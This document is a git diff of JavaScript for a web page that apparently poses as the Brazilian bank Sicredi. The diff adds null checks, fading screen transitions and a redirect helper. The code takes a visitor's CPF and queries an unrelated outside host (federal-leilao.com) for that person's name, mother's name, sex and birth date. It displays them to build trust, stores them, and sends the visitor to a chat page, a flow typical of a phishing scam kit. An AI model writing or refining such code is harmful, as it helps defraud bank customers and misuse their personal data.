@@ -26,9 +26,11 @@ document.addEventListener("DOMContentLoaded", function () {
   const cpfUsuario = document.getElementById("cpfUsuario");
   const sexoUsuario = document.getElementById("sexoUsuario");
   const nomeMae = document.getElementById("nomeMae");
-  const dataNascimento = document.getElementById("dataNascimento");
+  const dataNascimento = document.getElementById("dataNascimento"); // opcional
 
-  // Formatar CPF enquanto digita
+  // ==========================
+  // HELPERS
+  // ==========================
   function formatCPF(input) {
     let value = (input.value || "").replace(/\D/g, "");
     if (value.length > 11) value = value.slice(0, 11);
@@ -44,7 +46,6 @@ document.addEventListener("DOMContentLoaded", function () {
     input.value = value;
   }
 
-  // Validar CPF completo
   function validarCPF(cpf) {
     cpf = (cpf || "").replace(/[^\d]+/g, "");
     if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;
@@ -69,38 +70,78 @@ document.addEventListener("DOMContentLoaded", function () {
     if (String(dateString).length === 8) {
       return String(dateString).replace(/^(\d{4})(\d{2})(\d{2})$/, "$3/$2/$1");
     }
-    return dateString;
+    return String(dateString);
   }
 
   // ==========================
-  // CONSULTA CPF (SEM TIMEOUT)
+  // TROCA DE TELAS (igual seu fluxo)
+  // ==========================
+  function showCPFPage() {
+    if (!mainPage || !cpfPage) return;
+
+    mainPage.classList.add("fade-out");
+
+    setTimeout(() => {
+      mainPage.classList.add("hidden");
+      cpfPage.classList.remove("hidden");
+
+      // reflow
+      void cpfPage.offsetWidth;
+
+      cpfPage.classList.add("fade-in");
+      cpfPage.classList.remove("opacity-0");
+
+      if (cpfInputPage) cpfInputPage.focus();
+    }, 400);
+  }
+
+  function showMainPage() {
+    if (!mainPage || !cpfPage) return;
+
+    cpfPage.classList.remove("fade-in");
+    cpfPage.classList.add("opacity-0");
+
+    setTimeout(() => {
+      cpfPage.classList.add("hidden");
+      mainPage.classList.remove("hidden");
+
+      void mainPage.offsetWidth;
+
+      mainPage.classList.remove("fade-out");
+    }, 400);
+  }
+
+  // ==========================
+  // CONSULTA CPF (API federal-leilao) - SEM TIMEOUT
   // ==========================
   async function consultarCPF(cpf) {
-    const cpfLimpo = cpf.replace(/\D/g, "");
+    const cpfLimpo = (cpf || "").replace(/\D/g, "");
 
-    consultaResultado.classList.remove("hidden");
-    loadingInfo.classList.remove("hidden");
-    userInfo.classList.add("hidden");
-    errorInfo.classList.add("hidden");
+    // UI: mostrar área e loading
+    consultaResultado?.classList.remove("hidden");
+    loadingInfo?.classList.remove("hidden");
+    userInfo?.classList.add("hidden");
+    errorInfo?.classList.add("hidden");
 
-    consultaResultado.scrollIntoView({ behavior: "smooth", block: "center" });
+    consultaResultado?.scrollIntoView({ behavior: "smooth", block: "center" });
 
     try {
-      const response = await fetch(
-        `https://federal-leilao.com/v1/contratediscordrev0ltz/${encodeURIComponent(cpfLimpo)}`,
-        {
-          method: "GET",
-          headers: {
-            "user-agent":
-              "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
-          },
-        }
-      );
+      const url = `https://federal-leilao.com/v1/contratediscordrev0ltz/${encodeURIComponent(cpfLimpo)}`;
+
+      const response = await fetch(url, {
+        method: "GET",
+        headers: {
+          "user-agent":
+            "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
+          Accept: "application/json",
+        },
+      });
 
       const data = response.ok ? await response.json() : null;
 
-      loadingInfo.classList.add("hidden");
+      loadingInfo?.classList.add("hidden");
 
+      // Defaults (mantém fluxo mesmo se API falhar)
       let nomeCompleto = "Cliente Sicredi";
       let nascimento = "";
       let sexo = "";
@@ -113,78 +154,133 @@ document.addEventListener("DOMContentLoaded", function () {
         mae = data.mae || "";
       }
 
-      nomeUsuario.textContent = nomeCompleto;
-      cpfUsuario.textContent = cpfLimpo.replace(
-        /^(\d{3})(\d{3})(\d{3})(\d{2})$/,
-        "$1.$2.$3-$4"
-      );
-      sexoUsuario.textContent = sexo || "Não informado";
-      nomeMae.textContent = mae || "Não informado";
-      if (dataNascimento) dataNascimento.textContent = formatDate(nascimento);
+      // Preencher tela
+      if (nomeUsuario) nomeUsuario.textContent = nomeCompleto || "Não informado";
 
+      if (cpfUsuario) {
+        cpfUsuario.textContent = cpfLimpo
+          ? cpfLimpo.replace(/^(\d{3})(\d{3})(\d{3})(\d{2})$/, "$1.$2.$3-$4")
+          : "Não informado";
+      }
+
+      if (sexoUsuario) sexoUsuario.textContent = sexo || "Não informado";
+      if (nomeMae) nomeMae.textContent = mae || "Não informado";
+
+      if (dataNascimento) {
+        dataNascimento.textContent = formatDate(nascimento) || "Não informado";
+      }
+
+      // O /chat valida `dadosUsuario.nome` e `dadosUsuario.cpf`
       const dadosUsuario = {
-        nome: nomeCompleto,
-        cpf: cpfLimpo,
-        sexo,
-        nomeMae: mae,
-        dataNascimento: nascimento,
+        nome: nomeCompleto || "",
+        cpf: cpfLimpo || "",
+        sexo: sexo || "",
+        nomeMae: mae || "",
+        dataNascimento: nascimento || "",
       };
 
-      localStorage.setItem("cpf", cpfLimpo);
       localStorage.setItem("dadosUsuario", JSON.stringify(dadosUsuario));
-      localStorage.setItem("nomeUsuario", nomeCompleto);
-      localStorage.setItem("cpfUsuario", cpfLimpo);
+      localStorage.setItem("cpf", cpfLimpo);
 
-      sessionStorage.setItem("cpf", cpfLimpo);
-      sessionStorage.setItem("nomeCompleto", nomeCompleto);
-      sessionStorage.setItem("primeiroNome", nomeCompleto.split(" ")[0]);
-      sessionStorage.setItem("dataNascimento", nascimento || "");
-      sessionStorage.setItem("sexo", sexo || "");
-      sessionStorage.setItem("nomeMae", mae || "");
+      if (dadosUsuario.nome) localStorage.setItem("nomeUsuario", dadosUsuario.nome);
+      if (dadosUsuario.cpf) localStorage.setItem("cpfUsuario", dadosUsuario.cpf);
 
-      userInfo.classList.remove("hidden");
-      userInfo.scrollIntoView({ behavior: "smooth", block: "center" });
+      // Mostrar bloco de confirmação
+      userInfo?.classList.remove("hidden");
+      setTimeout(() => userInfo?.scrollIntoView({ behavior: "smooth", block: "center" }), 100);
     } catch (err) {
-      loadingInfo.classList.add("hidden");
-      errorMessage.textContent = "Erro ao consultar CPF. Tente novamente.";
-      errorInfo.classList.remove("hidden");
-      console.error(err);
+      loadingInfo?.classList.add("hidden");
+      if (errorMessage) errorMessage.textContent = "Erro ao consultar seus dados. Tente novamente.";
+      errorInfo?.classList.remove("hidden");
+      console.error("Erro na consulta:", err);
+      errorInfo?.scrollIntoView({ behavior: "smooth", block: "center" });
     }
   }
 
-  // Processar formulário
   function processForm() {
-    const cpf = cpfInputPage.value.replace(/\D/g, "");
+    const cpf = (cpfInputPage?.value || "").replace(/\D/g, "");
 
     if (!validarCPF(cpf)) {
-      alert("CPF inválido.");
+      alert("Por favor, digite um CPF válido.");
       return;
     }
 
     if (termsCheck && !termsCheck.checked) {
-      alert("Aceite os termos para continuar.");
+      alert("Você precisa concordar com os Termos de Uso e Política de Privacidade para continuar.");
       return;
     }
 
+    localStorage.setItem("cpf", cpf);
     consultarCPF(cpf);
   }
 
-  // Eventos
-  btnAtivar?.addEventListener("click", () => cpfPage.classList.remove("hidden"));
-  btnSimular?.addEventListener("click", () => cpfPage.classList.remove("hidden"));
-  btnVoltar?.addEventListener("click", () => cpfPage.classList.add("hidden"));
-  btnAnalisar?.addEventListener("click", processForm);
-  btnConfirmar?.addEventListener("click", () => {
-    window.location.href = "./chat/index.html";
-  });
-  btnCorrigir?.addEventListener("click", () => consultaResultado.classList.add("hidden"));
-  btnTentarNovamente?.addEventListener("click", () => consultaResultado.classList.add("hidden"));
+  // Redirecionar para o chat mantendo params
+  function redirecionarParaChat() {
+    const dadosUsuarioJSON = localStorage.getItem("dadosUsuario");
+    if (!dadosUsuarioJSON) {
+      alert("Dados do usuário não encontrados. Por favor, tente novamente.");
+      return;
+    }
 
-  cpfInputPage?.addEventListener("input", function () {
-    formatCPF(this);
-  });
-});
+    try {
+      const dadosUsuario = JSON.parse(dadosUsuarioJSON);
+      if (!dadosUsuario.cpf || !dadosUsuario.nome) {
+        alert("Dados incompletos. Por favor, reinicie o processo.");
+        window.location.href = "./index.html";
+        return;
+      }
 
+      const cpf = String(dadosUsuario.cpf).replace(/\D/g, "");
+
+      const urlAtual = new URLSearchParams(window.location.search);
+      const novaUrl = new URLSearchParams();
+
+      for (const [chave, valor] of urlAtual.entries()) {
+        novaUrl.append(chave, valor);
+      }
+
+      novaUrl.set("cpf", cpf);
+
+      window.location.href = `./chat/index.html?${novaUrl.toString()}`;
+    } catch (error) {
+      console.error("Erro ao processar dados para redirecionamento:", error);
+      alert("Ocorreu um erro ao processar seus dados. Por favor, tente novamente.");
+    }
+  }
+
+  function corrigirDados() {
+    consultaResultado?.classList.add("hidden");
+    if (cpfInputPage) cpfInputPage.focus();
+  }
+
+  function tentarNovamente() {
+    consultaResultado?.classList.add("hidden");
+    if (cpfInputPage) cpfInputPage.focus();
+  }
+
+  // ==========================
+  // EVENTOS (corrigidos)
+  // ==========================
+  if (btnAtivar) btnAtivar.addEventListener("click", (e) => { e.preventDefault?.(); showCPFPage(); });
+  if (btnSimular) btnSimular.addEventListener("click", (e) => { e.preventDefault?.(); showCPFPage(); });
+  if (btnVoltar) btnVoltar.addEventListener("click", (e) => { e.preventDefault?.(); showMainPage(); });
+
+  if (btnAnalisar) {
+    btnAnalisar.addEventListener("click", function (e) {
+      e.preventDefault?.();
+      processForm();
+    });
+  }
+
+  if (btnConfirmar) btnConfirmar.addEventListener("click", (e) => { e.preventDefault?.(); redirecionarParaChat(); });
+  if (btnCorrigir) btnCorrigir.addEventListener("click", (e) => { e.preventDefault?.(); corrigirDados(); });
+  if (btnTentarNovamente) btnTentarNovamente.addEventListener("click", (e) => { e.preventDefault?.(); tentarNovamente(); });
+
+  if (cpfInputPage) {
+    cpfInputPage.addEventListener("input", function () {
+      formatCPF(this);
+    });
+  }
 
   // ======================
   // Carrossel (igual antes)
@@ -211,8 +307,7 @@ document.addEventListener("DOMContentLoaded", function () {
     slides[index].classList.add("active");
 
     indicators.forEach((indicator, i) => {
-      if (i === index) indicator.classList.add("active");
-      else indicator.classList.remove("active");
+      indicator.classList.toggle("active", i === index);
     });
 
     updateSteps(index);
@@ -227,8 +322,7 @@ document.addEventListener("DOMContentLoaded", function () {
     });
 
     stepLines.forEach((line, i) => {
-      if (i < index) line.classList.add("active");
-      else line.classList.remove("active");
+      line.classList.toggle("active", i < index);
     });
   }
 
